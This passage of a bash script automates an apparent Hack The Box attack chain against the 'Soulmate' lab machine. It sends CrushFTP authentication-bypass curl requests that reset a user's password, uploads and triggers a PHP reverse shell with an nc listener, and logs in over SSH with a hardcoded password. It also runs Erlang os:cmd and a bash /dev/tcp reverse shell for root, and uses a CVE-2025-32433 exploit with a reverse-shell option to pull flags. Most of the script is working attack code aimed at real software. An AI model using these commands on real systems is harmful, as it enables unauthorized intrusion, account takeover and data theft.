    wrn "CrushFTP script exited $CRUSH_EXIT continuing anyway"
fi

# ─── PHASE 7: MANUAL UPLOAD FALLBACK ──────────────────────────────────────────
ph "7 CrushFTP Manual Upload (fallback reference)"

echo ""
echo -e "${CYAN}  If auto-upload failed, do this manually in your browser:${NC}"
sep
cat <<MANUAL
  1. Go to: http://ftp.soulmate.htb/
  2. Login with admin user created above: ${PWNER_USER} / ${PWNER_PASS}
  3. Click Admin → User Manager
  4. Find user "ben" → Edit → Change password to: ${BEN_PASS}
  5. Logout, login as ben / ${BEN_PASS}
  6. In the file browser, navigate to web root
  7. Upload file: ${WEBSHELL_FILE}
  8. Start listener: nc -lvnp ${SHELL_PORT}
  9. Trigger shell: curl http://soulmate.htb/${WEBSHELL_NAME}

  Alternatively: use curl to upload
  ─────────────────────────────────────────────────────────
  # First: get admin session via auth bypass
  TOKEN=\$(python3 -c "import random,string; print(''.join(random.choices(string.ascii_letters+string.digits,k=40)))")
  C2F="\${TOKEN: -4}"

  # Auth bypass + list users
  curl -s "http://ftp.soulmate.htb/WebInterface/function/?command=getUserList&c2f=\${C2F}" \\
    -H "Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/" \\
    -H "Cookie: CrushAuth=\${TOKEN}; currentAuth=\${C2F}"

  # Reset ben's password
  curl -s "http://ftp.soulmate.htb/WebInterface/function/?command=addUpdateUser&username=ben&password=${BEN_PASS}&c2f=\${C2F}" \\
    -H "Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/" \\
    -H "Cookie: CrushAuth=\${TOKEN}; currentAuth=\${C2F}"

MANUAL

# ─── PHASE 8: START LISTENER + TRIGGER SHELL ──────────────────────────────────
ph "8 Shell Trigger"

inf "Starting netcat listener on ${LHOST}:${SHELL_PORT}..."
echo ""
echo -e "${YELLOW}  ╔══[ ACTION REQUIRED ]══════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}  ║  Open a NEW terminal and run:                                 ║${NC}"
echo -e "${YELLOW}  ║                                                               ║${NC}"
echo -e "${YELLOW}  ║  nc -lvnp ${SHELL_PORT}                                            ║${NC}"
echo -e "${YELLOW}  ║                                                               ║${NC}"
echo -e "${YELLOW}  ║  Then trigger the shell:                                      ║${NC}"
echo -e "${YELLOW}  ║  curl -s http://soulmate.htb/${WEBSHELL_NAME}       ║${NC}"
echo -e "${YELLOW}  ╚═══════════════════════════════════════════════════════════════╝${NC}"
echo ""

# ─── PHASE 9: GET USER FLAG VIA SSH ───────────────────────────────────────────
ph "9 SSH as ben → User Flag"

inf "Known ben SSH credentials: ${BEN_USER} / ${BEN_PASS}"
inf "(Found in /usr/local/lib/erlang_login/start.escript on the box)"
sep

# The key script finding path:
cat <<'FINDING'
  www-data shell enumeration to find ben's creds:
  ─────────────────────────────────────────────────────────
  # Stabilize shell first:
  python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm

  # Find the Erlang script with embedded credentials:
  find / -name "*.escript" 2>/dev/null
  cat /usr/local/lib/erlang_login/start.escript

  # You'll see:
  # {user_passwords, [{"ben", "HouseH0ldings998"}]}

  # Now SSH in:
  # ssh ben@soulmate.htb
  # Password: HouseH0ldings998

FINDING
sep

# Actually grab user flag via SSH
inf "Attempting SSH login as ben..."
USER_FLAG=""

USER_FLAG=$(python3 - "$TARGET" "$BEN_USER" "$BEN_PASS" <<'PYEOF'
import pexpect
import re
import sys

host, user, pw = sys.argv[1], sys.argv[2], sys.argv[3]
ssh_cmd = (
    f"ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
    f"-o ConnectTimeout=12 {user}@{host}"
)

try:
    c = pexpect.spawn(ssh_cmd, encoding="utf-8", timeout=20)
    while True:
        i = c.expect([
            r"(?i)password:",
            r"[#$] ",
            r"Permission denied",
            pexpect.EOF,
            pexpect.TIMEOUT,
        ])
        if i == 0:
            c.sendline(pw)
        elif i == 1:
            break
        else:
            print("")
            sys.exit(0)

    c.sendline("cat /home/ben/user.txt")
    c.expect([r"[#$] ", pexpect.EOF, pexpect.TIMEOUT], timeout=10)
    out = c.before
    m = re.search(r"[0-9a-f]{32}", out or "")
    print(m.group(0) if m else "")
    c.sendline("exit")
except Exception:
    print("")
PYEOF
)

if [[ -n "$USER_FLAG" ]]; then
    echo "$USER_FLAG" > "$LOOT/user.txt"
    loot "user.txt : $USER_FLAG"
else
    wrn "SSH auto-grab failed try manually:"
    inf "ssh ${BEN_USER}@${TARGET} (password: ${BEN_PASS})"
    inf "cat ~/user.txt"
fi

# ─── PHASE 10: ERLANG SSH PRIVESC ─────────────────────────────────────────────
ph "10 Root via Erlang/OTP SSH"

echo ""
echo -e "${CYAN}  TWO PATHS TO ROOT:${NC}"
sep

echo -e "${WHITE}  PATH A Erlang SSH Direct (Simplest):${NC}"
cat <<'PATHA'
  ─────────────────────────────────────────────────────────
  # While SSH'd in as ben:
  ben@soulmate:~$ ssh -p 2222 ben@localhost
  # Password: HouseH0ldings998

  # You'll get an Erlang/OTP shell:
  (ssh_runner@soulmate)1>

  # Execute OS commands via os:cmd/1:
  (ssh_runner@soulmate)1> os:cmd("whoami").
  "root\n"
  (ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").
  "FLAG_HERE\n"

  # Get full reverse shell from Erlang shell:
  (ssh_runner@soulmate)3> os:cmd("bash -c 'bash -i >& /dev/tcp/LHOST/4445 0>&1'").

PATHA

echo ""
echo -e "${WHITE}  PATH B CVE-2025-32433 Pre-Auth RCE (No credentials needed):${NC}"
cat <<PATHB
  ─────────────────────────────────────────────────────────
  # Upload exploit to target as ben:
  scp -o StrictHostKeyChecking=no ${TOOLS}/erlang_rce.py ben@${TARGET}:/tmp/erlang_rce.py

  # On target as ben:
  # python3 /tmp/erlang_rce.py -t 127.0.0.1 -p 2222 --read-file /root/root.txt

  # Or get reverse shell (listener on Kali first: nc -lvnp ${ROOT_PORT}):
  # python3 /tmp/erlang_rce.py -t 127.0.0.1 -p 2222 --revshell --lhost ${LHOST} --lport ${ROOT_PORT}

PATHB

sep

# ─── PHASE 11: AUTOMATED ROOT GRAB ───────────────────────────────────────────
ph "11 Automated Root Flag Grab"

ROOT_FLAG=""
inf "Attempting automatic root flag retrieval via Erlang SSH..."

# Method: SSH as ben, then use Erlang SSH on localhost
ROOT_CMD="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p 2222 ben@localhost"

if command -v sshpass &>/dev/null; then
    # Primary: connect to internal Erlang SSH (2222) through ben@target with ProxyCommand.
    ROOT_FLAG=$(sshpass -p "$BEN_PASS" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=15 \
        -o ProxyCommand="sshpass -p '${BEN_PASS}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p ${BEN_USER}@${TARGET}" \
        -p 2222 "${BEN_USER}@localhost" \
        'os:cmd("cat /root/root.txt").' 2>/dev/null | grep -Eo '[0-9a-f]{32}' | head -1) || true

    if [[ -z "$ROOT_FLAG" ]]; then
        # Try CVE-2025-32433 upload + execute approach
        inf "Trying CVE-2025-32433 approach..."

        # Upload exploit to target
        sshpass -p "$BEN_PASS" scp \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            "$TOOLS/erlang_rce.py" \
            "${BEN_USER}@${TARGET}:/tmp/erlang_rce.py" 2>/dev/null || true

        # Execute read root.txt to /tmp/root_out.txt
        sshpass -p "$BEN_PASS" ssh \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            "${BEN_USER}@${TARGET}" \
            "python3 /tmp/erlang_rce.py -t 127.0.0.1 -p 2222 --read-file /root/root.txt --output-file /tmp/root_out.txt" \
            2>/dev/null | tail -5 || true

        sleep 2

        # Read the output file
        ROOT_FLAG=$(sshpass -p "$BEN_PASS" ssh \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            "${BEN_USER}@${TARGET}" \
            "cat /tmp/root_out.txt 2>/dev/null || cat /tmp/root.txt 2>/dev/null" \
            2>/dev/null | grep -Eo '[0-9a-f]{32}' | head -1) || true
    fi
fi

if [[ -n "$ROOT_FLAG" ]]; then
    echo "$ROOT_FLAG" > "$LOOT/root.txt"
    loot "root.txt : $ROOT_FLAG"
else
    wrn "Auto root grab failed use manual steps above"
    inf "Manual: ssh ben@${TARGET} → ssh -p 2222 ben@localhost → os:cmd(\"cat /root/root.txt\")."
fi

# ─── FINAL SUMMARY ────────────────────────────────────────────────────────────
ph "COMPLETE Attack Chain Summary"

echo ""
echo -e "${WHITE}  ┌──────────────────────────────────────────────────────────────┐${NC}"
echo -e "${WHITE}  │               Soulmate HTB Attack Flow                    │${NC}"
echo -e "${WHITE}  │                                                              │${NC}"
echo -e "${WHITE}  │  KALI → soulmate.htb:80 (main site PHP/Nginx)             │${NC}"
echo -e "${WHITE}  │           ↓ ffuf subdomain fuzz                             │${NC}"
echo -e "${WHITE}  │  KALI → ftp.soulmate.htb:80 (CrushFTP)                     │${NC}"
echo -e "${WHITE}  │           ↓ CVE-2025-31161 auth bypass                     │${NC}"
echo -e "${WHITE}  │           ↓ AWS4-HMAC-SHA256 Credential=crushadmin/         │${NC}"
echo -e "${WHITE}  │       Create admin user → Reset ben's password              │${NC}"
echo -e "${WHITE}  │           ↓ Login as ben                                    │${NC}"
echo -e "${WHITE}  │       Upload PHP reverse shell to web root                  │${NC}"
echo -e "${WHITE}  │           ↓ curl http://soulmate.htb/shell.php              │${NC}"
echo -e "${WHITE}  │  www-data shell                                             │${NC}"
echo -e "${WHITE}  │           ↓ find /usr/local/lib/erlang_login/start.escript  │${NC}"
echo -e "${WHITE}  │  SSH as ben / HouseH0ldings998 → user.txt 🚩               │${NC}"
echo -e "${WHITE}  │           ↓                                                 │${NC}"
echo -e "${WHITE}  │  Path A: ssh -p 2222 ben@localhost → Erlang shell           │${NC}"
echo -e "${WHITE}  │          os:cmd(\"cat /root/root.txt\") → root.txt 🚩        │${NC}"
echo -e "${WHITE}  │           ↓                                                 │${NC}"
echo -e "${WHITE}  │  Path B: CVE-2025-32433 Erlang SSH Pre-Auth RCE (CVSS 10)  │${NC}"
echo -e "${WHITE}  │          python3 erlang_rce.py -t 127.0.0.1 -p 2222        │${NC}"
echo -e "${WHITE}  │          --revshell --lhost LHOST --lport 4445 → root 🚩   │${NC}"
echo -e "${WHITE}  └──────────────────────────────────────────────────────────────┘${NC}"

echo ""
sep
echo -e "${CYAN}  Credentials:${NC}"
echo -e "  ${GREEN}▶${NC} CrushFTP admin bypass : Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/"
echo -e "  ${GREEN}▶${NC} New admin user        : ${PWNER_USER} / ${PWNER_PASS}"
echo -e "  ${GREEN}▶${NC} ben SSH               : ${BEN_USER} / ${BEN_PASS}"
echo -e "  ${GREEN}▶${NC} Erlang SSH (ben)      : ssh -p 2222 ben@localhost"
sep
echo -e "${CYAN}  Key Files:${NC}"
echo -e "  ${GREEN}▶${NC} Escript w/ creds : /usr/local/lib/erlang_login/start.escript"
echo -e "  ${GREEN}▶${NC} Erlang SSH port  : 127.0.0.1:2222 (internal only)"
echo -e "  ${GREEN}▶${NC} Log file         : $LOG_FILE"
sep
echo -e "${CYAN}  Flags:${NC}"

USER_F=$(cat "$LOOT/user.txt" 2>/dev/null | grep -Eo '[0-9a-f]{32}' | head -1 || echo "")
ROOT_F=$(cat "$LOOT/root.txt" 2>/dev/null | grep -Eo '[0-9a-f]{32}' | head -1 || echo "")

if [[ -n "$USER_F" ]]; then loot "user.txt → $USER_F"; else wrn "user.txt → (grab manually)"; fi
if [[ -n "$ROOT_F" ]]; then loot "root.txt → $ROOT_F"; else wrn "root.txt → (grab manually)"; fi

echo ""
echo -e "${MAGENTA}  ╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${MAGENTA}  ║  Shadow Junior 😈 HTB Nepal #3 Box Pwned!           ║${NC}"
echo -e "${MAGENTA}  ╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
